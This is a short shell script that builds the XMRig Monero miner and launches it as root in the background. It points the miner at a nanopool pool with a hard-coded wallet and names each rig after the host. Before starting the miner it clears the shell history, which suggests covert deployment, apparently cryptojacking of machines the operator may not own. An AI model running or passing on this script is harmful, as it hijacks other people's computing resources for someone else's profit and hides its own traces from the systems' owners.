cd /usr/local/bin
myworker=$(date +'%d%m_%H%M_')
username=$HOSTNAME
shortname=${username:0:10}
myworker+=$shortname
sudo apt-get update && apt-get upgrade -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
sudo git clone https://github.com/xmrig/xmrig.git
sudo mkdir xmrig/build && cd xmrig/build
sudo cmake ..
sudo make -j$(nproc)
history -c
sudo nohup ./xmrig -o xmr-us-east1.nanopool.org:14444 -u 86MbukuwW42DjbkU3vVckHP6LYRTWxrRF1G2J8ZwmEzARs14ME7uNdt1Sp4TmpARszgzqG2p4jwNT43NvfYAgrai9hGwgNE -k --tls --rig-id $myworker &
